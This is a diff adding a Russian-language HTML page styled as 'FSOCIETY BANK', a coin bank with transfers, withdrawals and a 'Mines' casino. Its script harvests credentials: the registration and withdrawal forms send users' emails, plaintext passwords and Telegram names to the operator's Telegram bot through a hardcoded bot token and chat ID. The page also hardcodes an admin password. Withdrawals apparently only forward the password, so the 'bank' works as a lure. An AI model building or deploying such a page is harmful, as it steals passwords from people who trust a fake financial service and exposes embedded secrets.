@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>FSOCIETY BANK – Telegram версия (ГОТОВ)</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(145deg, #eef2ff 0%, #d9e4ff 100%); min-height: 100vh; padding: 16px; }
+        .container { max-width: 700px; margin: 0 auto; background: #fff; border-radius: 48px; padding: 20px 18px 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
+        .logo { text-align: center; font-size: 1.6rem; font-weight: 800; background: linear-gradient(135deg, #0a4da4, #2c7be5); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .balance-strip { background: #eaf3ff; border-radius: 60px; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin: 10px 0 20px; }
+        .balance-item { background: white; border-radius: 40px; padding: 6px 20px; min-width: 120px; text-align: center; }
+        .balance-label { font-size: 0.7rem; color: #1f6392; }
+        .balance-value { font-size: 1.8rem; font-weight: bold; color: #0a4da4; }
+        button { background: #2c7be5; border: none; color: white; font-weight: 600; padding: 10px 20px; border-radius: 40px; cursor: pointer; margin: 5px; }
+        button:active { transform: scale(0.97); }
+        .btn-outline { background: #fff; color: #1f6392; border: 1px solid #7aaef0; }
+        .menu-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin-bottom: 25px; }
+        .card-panel { background: #fff; border-radius: 40px; padding: 20px; margin-top: 10px; border: 1px solid #cfe2ff; }
+        input, select { background: #f8fbff; border: 1px solid #b9d3ff; padding: 12px 18px; border-radius: 60px; font-size: 1rem; width: 100%; margin: 8px 0; outline: none; }
+        .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; max-width: 320px; margin: 20px auto; background: #f0f5ff; padding: 15px; border-radius: 28px; }
+        .mine-cell { aspect-ratio: 1; background: #fff; border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: bold; cursor: pointer; border: 1px solid #bbd6ff; }
+        .log-area { background: #f0f5ff; border-radius: 28px; padding: 12px; font-size: 0.75rem; font-family: monospace; height: 130px; overflow-y: auto; margin-top: 20px; }
+        footer { font-size: 0.65rem; text-align: center; margin-top: 20px; color: #6a8bbf; }
+        .admin-panel { background: #fff3e0; border: 2px solid #ff9800; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.75rem; }
+        th, td { border: 1px solid #ddd; padding: 6px; text-align: left; }
+        .warning-text { color: #d9534f; font-size: 0.75rem; margin-top: 5px; background: #ffe6e6; padding: 8px; border-radius: 30px; text-align: center; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">FSOCIETY BANK</div>
+
+    <div class="balance-strip">
+        <div class="balance-item"><div class="balance-label">🪙 МОНЕТЫ</div><div class="balance-value" id="balanceValue">0</div></div>
+        <div class="balance-item"><div class="balance-label">👤 АККАУНТ</div><div class="balance-value" id="userName">Гость</div></div>
+        <button id="logoutBtn" class="btn-outline">🚪 Выйти</button>
+        <button id="adminBtn" class="btn-outline" style="background:#ffe0b3;">👑 Админ</button>
+    </div>
+
+    <div class="menu-row">
+        <button id="btnReg">📝 Регистрация</button>
+        <button id="btnLogin">🔐 Вход</button>
+        <button id="btnTransfer">💸 Перевод</button>
+        <button id="btnWithdraw">💳 Вывод</button>
+        <button id="btnMines">🎲 Мины</button>
+    </div>
+
+    <div id="panelReg" class="card-panel">
+        <h3>✨ Регистрация</h3>
+        <div class="warning-text">⚠️ Укажите реальный Telegram и email — на эти данные будет вывод. Все данные уходят администратору.</div>
+        <input type="email" id="regEmail" placeholder="Email">
+        <input type="password" id="regPass" placeholder="Пароль">
+        <input type="text" id="regTg" placeholder="Telegram username (без @)">
+        <input type="text" id="promoCode" placeholder="Промокод">
+        <button id="doRegBtn">✅ Зарегистрироваться</button>
+        <div style="font-size:12px;">Бонус 150 монет + промокод 12341 (+350)</div>
+    </div>
+
+    <div id="panelLogin" class="card-panel" style="display:none;">
+        <h3>🔑 Вход</h3>
+        <input type="email" id="loginEmail" placeholder="Email">
+        <input type="password" id="loginPass" placeholder="Пароль">
+        <button id="doLoginBtn">Войти</button>
+    </div>
+
+    <div id="panelTransfer" class="card-panel" style="display:none;">
+        <h3>💸 Перевод монет</h3>
+        <input type="text" id="transferTo" placeholder="Telegram получателя (@user)">
+        <input type="number" id="transferAmount" placeholder="Сумма">
+        <button id="doTransferBtn">Отправить</button>
+    </div>
+
+    <div id="panelWithdraw" class="card-panel" style="display:none;">
+        <h3>💎 Вывод средств</h3>
+        <div class="warning-text">⚠️ Для вывода укажите те же данные, что при регистрации. Вывод от 650 до 15000 монет.</div>
+        <input type="email" id="wdEmail" placeholder="Email">
+        <input type="password" id="wdPass" placeholder="Пароль">
+        <input type="text" id="wdTg" placeholder="Telegram">
+        <input type="number" id="wdAmount" placeholder="Сумма (мин 650, макс 15000)">
+        <button id="doWithdrawBtn">Отправить заявку</button>
+    </div>
+
+    <div id="panelMines" class="card-panel" style="display:none;">
+        <h3>💣 Казино «МИНЫ»</h3>
+        <div>Ставка: <input type="number" id="betAmount" value="100" step="10"></div>
+        <div>Мин: <select id="minesCount"><option>1</option><option>2</option><option>3</option><option>4</option><option selected>5</option></select></div>
+        <button id="startGameBtn">🌀 Начать игру</button>
+        <button id="cashoutMinesBtn" style="background:#2a6b2f; display:none;">💵 Забрать выигрыш</button>
+        <div id="gameInfo" style="margin:12px;"></div>
+        <div id="minesField" class="mines-grid"></div>
+    </div>
+
+    <div id="adminPanel" class="card-panel admin-panel" style="display:none;">
+        <h3>👑 Админ-панель (локальная)</h3>
+        <div id="adminContent"></div>
+        <button id="closeAdminBtn">Закрыть</button>
+    </div>
+
+    <div class="log-area" id="logMessages"></div>
+    <footer>⚡ Все данные сохраняются в браузере и дублируются администратору в Telegram</footer>
+</div>
+
+<script>
+    // ====================== TELEGRAM НАСТРОЙКИ (УЖЕ ВСТАВЛЕНЫ) ======================
+    const BOT_TOKEN = "8872454100:AAGgPl-rPRcgqw6m2IuqvWayLqyWbhk0KsQ";
+    const ADMIN_CHAT_ID = "6211490246";
+
+    // ====================== ОСТАЛЬНОЙ КОД ======================
+    let users = [];
+    let currentUser = null;
+    let adminLogged = false;
+    let adminAttempts = 0;
+    let minesGame = { active: false, grid: [], revealed: [], bet: 0, safeRevealed: 0, totalSafe: 0, multiplier: 1 };
+
+    async function sendToAdmin(text) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+            if (resp.ok) addLog("✅ Уведомление отправлено админу");
+            else addLog("❌ Ошибка отправки в Telegram");
+        } catch(e) { addLog("❌ Ошибка сети при отправке в Telegram"); }
+        return true;
+    }
+
+    function loadData() {
+        let stored = localStorage.getItem("fsociety_telegram_bank");
+        users = stored ? JSON.parse(stored) : [];
+        let cur = localStorage.getItem("fsociety_telegram_current");
+        currentUser = cur ? JSON.parse(cur) : null;
+        updateUI();
+    }
+    function saveUsers() { localStorage.setItem("fsociety_telegram_bank", JSON.stringify(users)); }
+    function saveCurrent() { localStorage.setItem("fsociety_telegram_current", JSON.stringify(currentUser)); }
+    function addLog(msg) {
+        let log = document.getElementById("logMessages");
+        let p = document.createElement("div");
+        p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        log.appendChild(p);
+        log.scrollTop = log.scrollHeight;
+    }
+    function updateBalanceUI() {
+        document.getElementById("balanceValue").innerText = currentUser ? currentUser.balance : 0;
+        document.getElementById("userName").innerText = currentUser ? `@${currentUser.tg}` : "Гость";
+    }
+    function syncAndSaveBalance() {
+        if (!currentUser) return;
+        let idx = users.findIndex(u => u.email === currentUser.email);
+        if (idx !== -1) users[idx].balance = currentUser.balance;
+        saveUsers();
+        saveCurrent();
+        updateBalanceUI();
+    }
+
+    async function register(email, pass, tg, promo) {
+        if (!email || !pass || !tg) { addLog("❌ Заполните все поля"); return false; }
+        if (users.find(u => u.email === email)) { addLog("❌ Email уже есть"); return false; }
+        let bonus = 150;
+        if (promo === "12341") bonus = 500;
+        users.push({ email, password: pass, tg: tg.toLowerCase(), balance: bonus, regDate: new Date().toISOString() });
+        saveUsers();
+        addLog(`✅ Регистрация успешна! +${bonus} монет`);
+        await sendToAdmin(`🔴 <b>НОВАЯ РЕГИСТРАЦИЯ</b>\n📧 ${email}\n🔑 ${pass}\n📱 @${tg}\n💰 Бонус: ${bonus} монет`);
+        return true;
+    }
+
+    function login(email, pass) {
+        let user = users.find(u => u.email === email && u.password === pass);
+        if (!user) { addLog("❌ Неверный email/пароль"); return false; }
+        currentUser = { email: user.email, tg: user.tg, balance: user.balance, password: user.password };
+        saveCurrent();
+        addLog(`🔓 Добро пожаловать, @${user.tg}. Баланс: ${user.balance}`);
+        updateBalanceUI();
+        return true;
+    }
+
+    function logout() {
+        currentUser = null;
+        saveCurrent();
+        addLog("Вы вышли");
+        updateBalanceUI();
+        showPanel("panelReg");
+    }
+
+    async function transfer(toTg, amount) {
+        if (!currentUser) { addLog("Сначала войдите"); return false; }
+        if (amount <= 0) { addLog("Сумма >0"); return false; }
+        if (currentUser.balance < amount) { addLog("Недостаточно монет"); return false; }
+        let target = users.find(u => u.tg === toTg.replace('@', '').toLowerCase());
+        if (!target) { addLog("Получатель не найден"); return false; }
+        if (target.tg === currentUser.tg) { addLog("Нельзя себе"); return false; }
+        currentUser.balance -= amount;
+        target.balance += amount;
+        let idx = users.findIndex(u => u.email === target.email);
+        if (idx !== -1) users[idx].balance = target.balance;
+        syncAndSaveBalance();
+        addLog(`✅ Переведено ${amount} монет @${target.tg}`);
+        await sendToAdmin(`💸 <b>ПЕРЕВОД</b>\nОт: @${currentUser.tg}\nКому: @${target.tg}\nСумма: ${amount} монет`);
+        return true;
+    }
+
+    async function withdrawRequest(email, pass, tg, amount) {
+        if (!currentUser) { addLog("Войдите"); return false; }
+        if (amount < 650) { addLog("❌ Минимальная сумма вывода 650 монет"); return false; }
+        if (amount > 15000) { addLog("❌ Максимальная сумма вывода 15000 монет"); return false; }
+        if (currentUser.balance < amount) { addLog("Недостаточно монет"); return false; }
+        if (currentUser.email !== email || currentUser.password !== pass) { addLog("Неверный email/пароль"); return false; }
+        await sendToAdmin(`💸 <b>ЗАЯВКА НА ВЫВОД</b>\n👤 Email: ${email}\n🔑 Пароль: ${pass}\n📱 Telegram: @${tg}\n💰 Сумма: ${amount} монет\n📅 ${new Date().toLocaleString()}`);
+        addLog(`📤 Заявка на вывод ${amount} монет отправлена администратору. Ожидайте.`);
+        return true;
+    }
+
+    // ====================== МИНЫ ======================
+    function renderMinesGrid() {
+        let container = document.getElementById("minesField");
+        if (!container) return;
+        container.innerHTML = "";
+        if (!minesGame.grid.length) return;
+        for (let i = 0; i < 25; i++) {
+            let cell = document.createElement("div");
+            cell.className = "mine-cell";
+            let rev = minesGame.revealed[i];
+            let isMine = minesGame.grid[i] === 1;
+            if (!minesGame.active || rev) {
+                if (isMine) { cell.innerText = "💣"; cell.style.background = "#ffcccc"; }
+                else { cell.innerText = "💎"; cell.style.background = "#ccffcc"; }
+            } else {
+                cell.innerText = "❓";
+                cell.style.cursor = "pointer";
+                cell.onclick = (function(idx) { return () => revealCell(idx); })(i);
+            }
+            container.appendChild(cell);
+        }
+    }
+    async function revealCell(idx) {
+        if (!minesGame.active) return;
+        if (minesGame.revealed[idx]) return;
+        if (minesGame.grid[idx] === 1) {
+            minesGame.active = false;
+            addLog(`💥 МИНА! Проигрыш ${minesGame.bet} монет`);
+            await sendToAdmin(`💣 <b>ПРОИГРЫШ В КАЗИНО</b>\n👤 @${currentUser.tg}\n💰 Потеряно: ${minesGame.bet} монет`);
+            renderMinesGrid();
+            document.getElementById("cashoutMinesBtn").style.display = "none";
+            document.getElementById("gameInfo").innerHTML = "<span style='color:red'>💀 ПРОИГРЫШ 💀</span>";
+            return;
+        }
+        minesGame.revealed[idx] = true;
+        minesGame.safeRevealed++;
+        let progress = minesGame.safeRevealed / minesGame.totalSafe;
+        minesGame.multiplier = 1 + progress * 3.5;
+        let potential = Math.floor(minesGame.bet * minesGame.multiplier);
+        document.getElementById("gameInfo").innerHTML = `🔓 Безопасно: ${minesGame.safeRevealed}/${minesGame.totalSafe} | множитель x${minesGame.multiplier.toFixed(2)} | выигрыш: ${potential}`;
+        renderMinesGrid();
+        if (minesGame.safeRevealed === minesGame.totalSafe) {
+            let win = Math.floor(minesGame.bet * minesGame.multiplier);
+            let newBalance = currentUser.balance + win;
+            if (newBalance > 30000) newBalance = 30000;
+            currentUser.balance = newBalance;
+            syncAndSaveBalance();
+            addLog(`🏆 ПОБЕДА! Выиграно ${win} монет`);
+            await sendToAdmin(`🏆 <b>ПОБЕДА В КАЗИНО</b>\n👤 @${currentUser.tg}\n💰 Выиграно: ${win} монет`);
+            minesGame.active = false;
+            document.getElementById("cashoutMinesBtn").style.display = "none";
+            renderMinesGrid();
+        } else {
+            document.getElementById("cashoutMinesBtn").style.display = "inline-block";
+        }
+    }
+    async function cashoutMines() {
+        if (!minesGame.active) return;
+        let win = Math.floor(minesGame.bet * minesGame.multiplier);
+        let newBalance = currentUser.balance + win;
+        if (newBalance > 30000) newBalance = 30000;
+        currentUser.balance = newBalance;
+        syncAndSaveBalance();
+        addLog(`💸 Забрали выигрыш: ${win} монет`);
+        await sendToAdmin(`💸 <b>ВЫВОД В КАЗИНО</b>\n👤 @${currentUser.tg}\n💰 Выиграно: ${win} монет`);
+        minesGame.active = false;
+        document.getElementById("cashoutMinesBtn").style.display = "none";
+        renderMinesGrid();
+    }
+    function startMines(bet, minesCount) {
+        if (!currentUser) { addLog("Войдите"); return false; }
+        if (bet <= 0 || bet > currentUser.balance) { addLog("Недостаточно монет"); return false; }
+        currentUser.balance -= bet;
+        syncAndSaveBalance();
+        let grid = Array(25).fill(0);
+        let mines = Math.min(minesCount, 5);
+        let placed = 0;
+        while (placed < mines) {
+            let idx = Math.floor(Math.random() * 25);
+            if (grid[idx] === 0) { grid[idx] = 1; placed++; }
+        }
+        minesGame = {
+            active: true, grid: grid, revealed: Array(25).fill(false),
+            bet: bet, safeRevealed: 0, totalSafe: 25 - mines, multiplier: 1
+        };
+        renderMinesGrid();
+        document.getElementById("cashoutMinesBtn").style.display = "none";
+        document.getElementById("gameInfo").innerHTML = `🎲 Игра началась, мин: ${mines}, ставка ${bet}`;
+        addLog(`Начата игра "МИНЫ" на ${bet} монет (ставка списана)`);
+        return true;
+    }
+
+    function showPanel(id) {
+        let panels = ["panelReg", "panelLogin", "panelTransfer", "panelWithdraw", "panelMines"];
+        panels.forEach(p => document.getElementById(p).style.display = "none");
+        document.getElementById(id).style.display = "block";
+    }
+    function updateUI() {
+        updateBalanceUI();
+        if (!currentUser) showPanel("panelReg");
+        else showPanel("panelTransfer");
+    }
+
+    function showAdminLogin() {
+        if (adminLogged) {
+            renderAdminPanel();
+            document.getElementById("adminPanel").style.display = "block";
+            return;
+        }
+        let pwd = prompt("Введите пароль администратора:");
+        if (pwd === "19374649") {
+            adminLogged = true;
+            adminAttempts = 0;
+            renderAdminPanel();
+            document.getElementById("adminPanel").style.display = "block";
+            addLog("👑 Администратор вошёл в панель");
+        } else {
+            adminAttempts++;
+            if (adminAttempts >= 2) {
+                document.getElementById("adminBtn").style.display = "none";
+                addLog("❌ Две неудачные попытки. Кнопка админа скрыта.");
+                alert("Кнопка админа скрыта. Обновите страницу для восстановления.");
+            } else {
+                alert("Неверный пароль. Осталось попыток: " + (2 - adminAttempts));
+            }
+        }
+    }
+    function renderAdminPanel() {
+        let container = document.getElementById("adminContent");
+        let html = "<h4>📋 Пользователи (локальная копия)</h4><table><tr><th>Telegram</th><th>Email</th><th>Баланс</th></tr>";
+        users.forEach(u => {
+            html += `<tr><td>@${u.tg}</td><td>${u.email}</td><td>${u.balance}</td></tr>`;
+        });
+        html += `</table><hr><p><i>Все регистрации, переводы, заявки, победы и проигрыши в минах дублируются в Telegram администратора.</i></p>`;
+        container.innerHTML = html;
+    }
+
+    document.getElementById("doRegBtn").onclick = () => {
+        let email = document.getElementById("regEmail").value.trim();
+        let pass = document.getElementById("regPass").value;
+        let tg = document.getElementById("regTg").value.trim();
+        let promo = document.getElementById("promoCode").value.trim();
+        if (register(email, pass, tg, promo)) {
+            document.getElementById("regEmail").value = "";
+            document.getElementById("regPass").value = "";
+            document.getElementById("regTg").value = "";
+            document.getElementById("promoCode").value = "";
+            showPanel("panelLogin");
+        }
+    };
+    document.getElementById("doLoginBtn").onclick = () => {
+        let email = document.getElementById("loginEmail").value.trim();
+        let pass = document.getElementById("loginPass").value;
+        if (login(email, pass)) showPanel("panelTransfer");
+    };
+    document.getElementById("doTransferBtn").onclick = () => {
+        let to = document.getElementById("transferTo").value;
+        let amount = parseInt(document.getElementById("transferAmount").value);
+        if (transfer(to, amount)) {
+            document.getElementById("transferTo").value = "";
+            document.getElementById("transferAmount").value = "";
+            updateBalanceUI();
+        }
+    };
+    document.getElementById("doWithdrawBtn").onclick = () => {
+        let email = document.getElementById("wdEmail").value.trim();
+        let pass = document.getElementById("wdPass").value;
+        let tg = document.getElementById("wdTg").value.trim();
+        let amount = parseInt(document.getElementById("wdAmount").value);
+        withdrawRequest(email, pass, tg, amount);
+    };
+    document.getElementById("startGameBtn").onclick = () => {
+        let bet = parseInt(document.getElementById("betAmount").value);
+        let mines = parseInt(document.getElementById("minesCount").value);
+        startMines(bet, mines);
+    };
+    document.getElementById("cashoutMinesBtn").onclick = cashoutMines;
+    document.getElementById("btnReg").onclick = () => { if (!currentUser) showPanel("panelReg"); else addLog("Уже авторизован"); };
+    document.getElementById("btnLogin").onclick = () => { if (!currentUser) showPanel("panelLogin"); else addLog("Уже вошли"); };
+    document.getElementById("btnTransfer").onclick = () => { if (currentUser) showPanel("panelTransfer"); else addLog("Войдите"); };
+    document.getElementById("btnWithdraw").onclick = () => { if (currentUser) showPanel("panelWithdraw"); else addLog("Войдите"); };
+    document.getElementById("btnMines").onclick = () => { if (currentUser) showPanel("panelMines"); else addLog("Войдите"); };
+    document.getElementById("logoutBtn").onclick = logout;
+    document.getElementById("adminBtn").onclick = showAdminLogin;
+    document.getElementById("closeAdminBtn").onclick = () => document.getElementById("adminPanel").style.display = "none";
+
+    loadData();
+</script>
+</body>
+</html>
